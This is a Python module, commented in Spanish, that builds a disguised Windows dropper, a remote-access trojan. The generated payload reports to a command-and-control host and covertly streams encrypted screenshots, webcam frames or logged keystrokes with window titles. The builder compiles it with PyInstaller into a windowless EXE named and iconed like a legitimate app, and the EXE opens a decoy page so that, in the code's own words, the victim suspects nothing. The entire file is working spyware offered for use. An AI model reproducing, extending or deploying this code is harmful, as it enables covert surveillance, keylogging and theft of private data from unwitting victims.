import os
import sys
import subprocess
import shutil
from pathlib import Path

def _read_crypto_source():
    """Lee el código fuente de crypto.py para embebir en el payload"""
    crypto_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "utils", "crypto.py")
    with open(crypto_path, 'r', encoding='utf-8') as f:
        return f.read()

def get_exe_launcher(ip, port, fps, quality, monitor, auto_reconnect, mode, decoy_url=""):
    """Genera código Python para un ejecutable autocontenido.
    
    El payload embebe crypto.py directamente en el código para no depender
    de archivos externos. Se disfraza abriendo una app inocente.
    """
    
    # Leer crypto.py y escapar para triple-quote embedding
    crypto_source = _read_crypto_source()
    
    launcher_code = '''#!/usr/bin/env python3
import os
import sys
import subprocess
import threading
import time
import socket
import struct
import json
import platform
import hashlib

# ===== CRYPTO MODULE EMBEBIDO =====
''' + crypto_source + '''
# ===== FIN CRYPTO =====

# Configuración del payload
TARGET_IP = "''' + ip + '''"
TARGET_PORT = ''' + str(port) + '''
PAYLOAD_MODE = "''' + mode + '''"
AUTO_RECONNECT = ''' + str(auto_reconnect) + '''
FPS = ''' + str(fps) + '''
QUALITY = ''' + str(quality) + '''
MONITOR = ''' + str(monitor) + '''

def do_handshake(sock, initial_mode):
    """Realiza handshake con el C2, devuelve cipher y el modo ordenado por el C2"""
    iv = generate_iv()
    key = derive_key("crock_default_key_change_me_2024")
    cipher = AESCipher(key, iv)
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.system(),
        "mode": initial_mode
    }
    info_json = json.dumps(info).encode('utf-8')
    enc_info = cipher.process(info_json)
    sock.sendall(struct.pack('>4s16sI', b'CRCK', iv, len(enc_info)) + enc_info)
    
    # Recibir respuesta del C2 con el modo de ataque deseado
    try:
        sock.settimeout(10)
        enc_cmd_len = sock.recv(4)
        if len(enc_cmd_len) == 4:
            cmd_len = struct.unpack('>I', cipher.process(enc_cmd_len))[0]
            enc_cmd = sock.recv(cmd_len)
            cmd = cipher.process(enc_cmd).decode('utf-8')
            if cmd:
                return cipher, cmd
    except Exception:
        pass
        
    return cipher, initial_mode

def execute_payload():
    """Ejecuta el payload principal conectándose al C2 para saber qué hacer"""
    try:
        # Hacemos una conexión inicial rápida para saber el modo
        mode_to_run = PAYLOAD_MODE
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            cipher, mode_to_run = do_handshake(s, PAYLOAD_MODE)
            s.close()
        except:
            pass
            
        if mode_to_run == "screen":
            execute_screen_payload()
        elif mode_to_run == "keylogger":
            execute_keylogger_payload()
        elif mode_to_run == "camera":
            execute_camera_payload()
        else:
            execute_screen_payload()
    except Exception:
        pass

def execute_camera_payload():
    """Captura de cámara web y envía frames cifrados"""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("[-] No se pudo abrir la cámara.")
            return
        max_retries = 3 if AUTO_RECONNECT else 1
        retries = 0
        while retries < max_retries:
            s = None
            cipher = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                s.connect((TARGET_IP, TARGET_PORT))
                retries = 0
                cipher, _ = do_handshake(s, "camera")
                while True:
                    ret, frame = cap.read()
                    if not ret:
                        break
                    h, w = frame.shape[:2]
                    frame_bytes = frame.tobytes()
                    size = len(frame_bytes)
                    header = struct.pack('>HH', w, h)
                    s.sendall(cipher.process(header))
                    s.sendall(cipher.process(frame_bytes))
                    time.sleep(1 / FPS)
            except (BrokenPipeError, ConnectionResetError, socket.timeout):
                break
            except Exception as e:
                print(f"[-] Error cámara: {e}")
                break
            finally:
                if s:
                    s.close()
            retries += 1
            if AUTO_RECONNECT:
                time.sleep(2)
        cap.release()
    except ImportError:
        print("[-] OpenCV no está instalado. Instala con pip install opencv-python")
    except Exception as e:
        print(f"[-] Error en execute_camera_payload: {e}")

def execute_screen_payload():
    """Captura de pantalla con cifrado"""
    try:
        try:
            import mss
        except ImportError:
            import subprocess
            subprocess.run(["pip", "install", "mss", "-q"], capture_output=True)
            import mss
        try:
            from PIL import Image
            import io
        except ImportError:
            import subprocess
            subprocess.run(["pip", "install", "Pillow", "-q"], capture_output=True)
            from PIL import Image
            import io

        max_retries = 3 if AUTO_RECONNECT else 1
        retries = 0
        while retries < max_retries:
            s = None
            cipher = None
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(5)
                s.connect((TARGET_IP, TARGET_PORT))
                retries = 0
                cipher, _ = do_handshake(s, "screen")
                
                with mss.mss() as sct:
                    monitor_obj = sct.monitors[MONITOR] if MONITOR < len(sct.monitors) else sct.monitors[0]
                    
                    while True:
                        try:
                            frame = sct.grab(monitor_obj)
                            
                            # Convert mss frame to Pillow Image
                            img = Image.frombytes("RGB", frame.size, frame.bgra, "raw", "BGRX")
                            
                            # Scale for better visibility but still compressed
                            scale_percent = 85 
                            width = int(frame.width * scale_percent / 100)
                            height = int(frame.height * scale_percent / 100)
                            img = img.resize((width, height), Image.Resampling.BILINEAR)

                            # Compress as JPEG, boosting quality slightly
                            buf = io.BytesIO()
                            img.save(buf, format="JPEG", quality=max(QUALITY, 75))
                            data = buf.getvalue()

                            # Send Size (4 bytes) + JPEG Data
                            size_enc = cipher.process(struct.pack('>I', len(data)))
                            data_enc = cipher.process(data)
                            s.sendall(size_enc + data_enc)
                            
                            time.sleep(1/FPS)
                        except (BrokenPipeError, ConnectionResetError):
                            break
                        except Exception:
                            break
                
                if not AUTO_RECONNECT:
                    break
                retries += 1
                time.sleep(2)
                
            except Exception:
                if s:
                    try:
                        s.close()
                    except:
                        pass
                retries += 1
                if retries < max_retries and AUTO_RECONNECT:
                    time.sleep(2)
                else:
                    break
    except:
        pass

def execute_keylogger_payload():
    """Captura de teclas con cifrado y envío al C2"""
    try:
        try:
            from pynput import keyboard
        except ImportError:
            import subprocess
            subprocess.run(["pip", "install", "pynput", "-q"], capture_output=True)
            from pynput import keyboard
            
        import queue, time, socket, threading
        key_queue = queue.Queue()
        s = None
        cipher = None
        
        def maintain_connection():
            nonlocal s, cipher
            max_retries = 3 if AUTO_RECONNECT else 1
            retries = 0
            while True:
                try:
                    if s is None:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        s.settimeout(5)
                        s.connect((TARGET_IP, TARGET_PORT))
                        retries = 0
                        cipher, _ = do_handshake(s, "keylogger")
                    
                    while not key_queue.empty():
                        try:
                            data = key_queue.get(timeout=1)
                            data_bytes = data.encode() if isinstance(data, str) else data
                            s.sendall(cipher.process(data_bytes))
                        except:
                            pass
                    
                    time.sleep(0.1)
                except Exception:
                    try:
                        if s:
                            s.close()
                    except:
                        pass
                    s = None
                    cipher = None
                    if AUTO_RECONNECT and retries < max_retries:
                        retries += 1
                        time.sleep(2)
                    else:
                        break
        
        def get_active_window():
            import ctypes
            try:
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value if buf.value else "Unknown Window"
            except:
                return "Unknown Window"

        last_window = ""

        def on_press(key):
            nonlocal last_window
            try:
                current_window = get_active_window()
                if current_window != last_window:
                    last_window = current_window
                    key_queue.put("\\n\\n[Window: " + current_window + "]\\n")

                if hasattr(key, 'char') and key.char:
                    key_queue.put(key.char)
                elif hasattr(key, 'name'):
                    key_queue.put(f"[{key.name}]")
                else:
                    key_queue.put("[UNKNOWN]")
            except:
                pass
        
        conn_thread = threading.Thread(target=maintain_connection, daemon=True)
        conn_thread.start()
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        listener.join()
    except Exception as e:
        print(f"[-] Error en execute_keylogger_payload: {e}")

def show_decoy_app():
    """Abre el sitio web legitimo o app para disfrazar la ejecucion"""
    decoy_url = "''' + decoy_url + '''"
    try:
        if decoy_url:
            import webbrowser
            webbrowser.open(decoy_url)
        else:
            import subprocess
            subprocess.Popen("explorer.exe", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass

if __name__ == "__main__":
    payload_thread = threading.Thread(target=execute_payload, daemon=True)
    payload_thread.start()
    
    show_decoy_app()
    
    try:
        while payload_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    except:
        pass
    
    sys.exit(0)
'''
    
    return launcher_code

def create_exe_stub(usb_path, ip, port, fps, quality, monitor, auto_reconnect, mode, decoy_url=""):
    """Crea el launcher.py autocontenido en la ruta indicada"""
    # Usar carpeta output/ para no ensuciar el root y evitar problemas de permisos
    output_dir = os.path.join(usb_path, "output")
    os.makedirs(output_dir, exist_ok=True)
    launcher_py_path = os.path.join(output_dir, "launcher.py")
    
    # Quitar atributos oculto/solo-lectura si el archivo ya existia de un intento previo
    if os.path.exists(launcher_py_path):
        subprocess.run(f'attrib -h -r "{launcher_py_path}"', shell=True, capture_output=True)
        
    try:
        code = get_exe_launcher(ip, port, fps, quality, monitor, auto_reconnect, mode, decoy_url)
        
        with open(launcher_py_path, 'w', encoding='utf-8') as f:
            f.write(code)
        
        print(f"[+] Launcher Python creado en: output/launcher.py")
        return launcher_py_path
        
    except Exception as e:
        print(f"[-] Error creando launcher: {e}")
        return None

def create_pyinstaller_spec(usb_path, launcher_py_path):
    """Crea un archivo spec para PyInstaller"""
    
    spec_content = '''# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['launcher.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['mss', 'pynput', 'cv2'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludedimports=[],
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=None)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='app',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
'''
    
    spec_path = os.path.join(usb_path, "build.spec")
    try:
        with open(spec_path, 'w', encoding='utf-8') as f:
            f.write(spec_content)
        print(f"[+] Build spec creado: build.spec")
        return spec_path
    except Exception as e:
        print(f"[-] Error creando spec: {e}")
        return None

def check_pyinstaller():
    """Verifica si PyInstaller está instalado"""
    try:
        result = subprocess.run(
            ["pip", "show", "pyinstaller"],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.returncode == 0
    except:
        return False

def build_exe(usb_path, launcher_py_path, app_name, icon_path=""):
    """Intenta compilar a EXE usando PyInstaller"""
    
    if not check_pyinstaller():
        print(f"[-] PyInstaller no está instalado")
        print(f"[*] Instalando PyInstaller...")
        try:
            subprocess.run(
                ["pip", "install", "pyinstaller", "-q"],
                timeout=60
            )
            print(f"[+] PyInstaller instalado")
        except Exception as e:
            print(f"[-] Error instalando PyInstaller: {e}")
            return False
    
    try:
        build_dir = os.path.join(usb_path, "build_tmp")
        os.makedirs(build_dir, exist_ok=True)
        
        build_launcher = os.path.join(build_dir, "launcher.py")
        shutil.copy(launcher_py_path, build_launcher)
        
        print(f"[*] Compilando a EXE...")
        cmd = [
            "pyinstaller",
            "--onefile",
            "--windowed",
            f"--distpath={build_dir}",
            f"--workpath={build_dir}/build",
            f"--specpath={build_dir}",
            build_launcher
        ]
        
        if icon_path and os.path.exists(icon_path):
            cmd.append(f"--icon={icon_path}")
        else:
            cmd.append("--icon=NONE")
            
        result = subprocess.run(
            cmd,
            cwd=build_dir,
            capture_output=True,
            text=True,
            timeout=120
        )
        
        exe_path = os.path.join(build_dir, "launcher.exe")
        if os.path.exists(exe_path) and result.returncode == 0:
            app_exe = os.path.join(usb_path, "output", app_name)
            
            # Limpiar version vieja si existe
            if os.path.exists(app_exe):
                subprocess.run(f'attrib -h -r "{app_exe}"', shell=True, capture_output=True)
                os.remove(app_exe)
                
            shutil.copy(exe_path, app_exe)
            shutil.rmtree(build_dir, ignore_errors=True)
            
            print(f"[+] EXE compilado exitosamente: output/{app_name}")
            return True
        else:
            print(f"[-] Error compilando EXE. Codigo: {result.returncode}")
            if result.stderr:
                print(f"[DEBUG] PyInstaller STDERR:\n{result.stderr[-1000:]}")
            elif result.stdout:
                print(f"[DEBUG] PyInstaller STDOUT:\n{result.stdout[-1000:]}")
            return False
            
    except subprocess.TimeoutExpired:
        print(f"[-] La compilación tardó demasiado")
        return False
    except Exception as e:
        print(f"[-] Error compilando EXE: {e}")
        return False

def create_app_launcher(usb_path, ip, port, fps, quality, monitor, auto_reconnect, mode):
    """Orquesta la creación del ejecutable"""
    
    print(f"\n" + "█"*60)
    print(f"  CREAR DROPPER EJECUTABLE")
    print("█"*60)
    
    if usb_path == ".":
        usb_path = os.getcwd()
        print(f"\n[*] Directorio de salida: {usb_path}")
    
    app_name = input("\n[*] Nombre de la app (ej. Google Chrome) [app]: ").strip()
    if not app_name:
        app_name = "app"
    if not app_name.lower().endswith(".exe"):
        app_name += ".exe"
        
    decoy_url = input("[*] URL a redireccionar al abrir (ej. https://google.com) [vacio=abrir explorer]: ").strip()
    
    icon_path = input("[*] Ruta del icono .ico o URL directa (opcional, Enter para omitir): ").strip()
    
    downloaded_icon = None
    if icon_path.startswith("http://") or icon_path.startswith("https://"):
        print(f"[*] Descargando icono desde la red...")
        import urllib.request
        try:
            downloaded_icon = os.path.join(usb_path, "temp_icon.ico")
            urllib.request.urlretrieve(icon_path, downloaded_icon)
            icon_path = downloaded_icon
            print(f"[+] Icono descargado exitosamente.")
        except Exception as e:
            print(f"[-] Error descargando icono: {e}")
            icon_path = ""
            
    elif icon_path and not os.path.exists(icon_path):
        print("[-] Icono local no encontrado, se compilara sin icono especial.")
        icon_path = ""
    
    print(f"\n[*] Configuración:")
    print(f"    Target: {ip}:{port} ({mode.upper()})")
    print(f"    App Name: {app_name}")
    print(f"    Redireccion: {decoy_url if decoy_url else 'Explorer'}")
    
    # Paso 1: Crear launcher.py
    print(f"\n[*] Paso 1: Generando código Python...")
    launcher_py = create_exe_stub(usb_path, ip, port, fps, quality, monitor, auto_reconnect, mode, decoy_url)
    if not launcher_py:
        return False
    
    # Paso 2: Intentar compilar a EXE
    print(f"\n[*] Paso 2: Compilando a ejecutable...")
    exe_created = build_exe(usb_path, launcher_py, app_name, icon_path)
    
    if exe_created:
        print(f"\n" + "="*60)
        print(f"[+] ¡DROPPER CREADO CON EXITO!")
        print("="*60)
        print(f"\n[*] Archivo final: {os.path.join(usb_path, app_name)}")
        print(f"\n[*] Comportamiento al ejecutar:")
        print(f"    1. El payload se lanza 100% oculto en background hacia {ip}:{port}")
        if decoy_url:
            print(f"    2. Inmediatamente abre el navegador por defecto en: {decoy_url}")
        else:
            print(f"    2. Abre el Explorador de archivos para disimular.")
        print(f"[*] La victima vera la app esperada, sin sospechar nada.")
        print("="*60)
        
        # Limpiamos archivos temporales
        try:
            os.remove(launcher_py)
            if downloaded_icon and os.path.exists(downloaded_icon):
                os.remove(downloaded_icon)
        except:
            pass
            
        return True
    else:
        print(f"\n[-] No se pudo compilar a EXE")
        return False

if __name__ == "__main__":
    print("Módulo exe_builder.py cargado correctamente")
